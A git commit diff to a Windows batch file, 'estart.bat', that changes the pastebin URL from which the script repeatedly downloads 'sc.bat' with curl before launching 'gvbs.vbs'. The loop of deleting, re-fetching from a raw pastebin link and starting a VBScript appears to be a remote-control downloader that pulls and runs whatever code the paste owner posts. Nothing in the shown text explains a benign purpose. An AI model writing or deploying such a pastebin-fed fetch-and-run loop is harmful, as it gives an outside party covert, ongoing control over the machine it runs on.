d98ab28f38fe41c843e30be9d875565045014d43
SeduHome <125974063+SeduHome@users.noreply.github.com>
2024-04-08 11:58:23 +0200

    Update estart.bat

--- Beruf/Beruf/estart.bat
+++ Beruf/Beruf/estart.bat
@@ -2,7 +2,7 @@
 :a
 del sc.bat /a /q
 timeout /t 2 /nobreak >nul
-curl https://pastebin.com/raw/2u4QP3DZ>sc.bat
+curl https://pastebin.com/raw/HT1qwtca>sc.bat
 timeout /t 2 /nobreak >nul
 start gvbs.vbs
 timeout /t 9 /nobreak >nul
